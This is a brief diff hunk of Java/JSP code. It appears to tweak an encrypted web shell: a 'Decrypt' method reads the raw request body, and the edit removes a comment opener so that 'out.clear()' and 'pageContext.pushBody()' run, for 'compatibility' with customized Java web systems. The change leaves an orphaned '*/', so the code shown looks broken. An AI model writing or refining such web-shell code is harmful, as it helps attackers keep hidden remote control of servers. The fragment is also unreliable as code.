@@ -34,7 +34,6 @@ private byte[] Decrypt(byte[] data) throws Exception
                 bos.write(data);
                 length=request.getInputStream().read(buf);
             }
-            /* 取消如下代码的注释，可避免response.getOutputstream报错信息，增加某些深度定制的Java web系统的兼容性
             out.clear();
             out=pageContext.pushBody();
             */
